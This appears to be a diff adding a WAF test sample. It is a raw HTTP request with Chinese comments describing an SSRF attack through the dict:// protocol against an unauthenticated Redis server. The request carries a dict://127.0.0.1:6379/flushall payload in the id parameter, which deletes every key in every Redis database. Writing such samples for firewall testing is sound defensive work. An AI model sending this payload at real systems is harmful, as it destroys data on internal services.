@@ -1,0 +1,9 @@
+# SSRF服务端请求伪造_DICT协议_redis刷新数据库
+# 利用dict协议攻击未授权redis服务，清空整个 Redis 服务器的数据(删除所有数据库的所有 key。
+GET /?id=dict:%2F%2F127.0.0.1:6379%2Fflushall&bid=hd_tag_m8mv24nb HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24nb
+RM-PRO-Token: e09d3b7d68fd821d82b353a07b6caab9
+RM-PRO-Time: 1742808394256
+User-Agent: curl/7.83.1
+
